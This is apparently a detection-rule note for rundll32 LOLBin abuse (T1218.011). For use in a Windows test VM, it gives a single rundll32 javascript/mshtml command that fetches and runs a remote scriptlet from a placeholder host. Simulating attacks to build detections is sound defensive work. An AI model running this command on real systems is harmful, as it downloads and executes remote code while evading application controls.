## Rule 003 - Rundll32 Suspicious Script Execution (T1218.011)

### Purpose
Simulate LOLBin abuse where `rundll32.exe` is used to execute script/URL handler style payloads (ex: `javascript:` + `mshtml`).

### Commands (Windows VM, PowerShell)
```powershell
# rundll32 javascript/mshtml execution pattern

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://example.com/test.sct").Exec();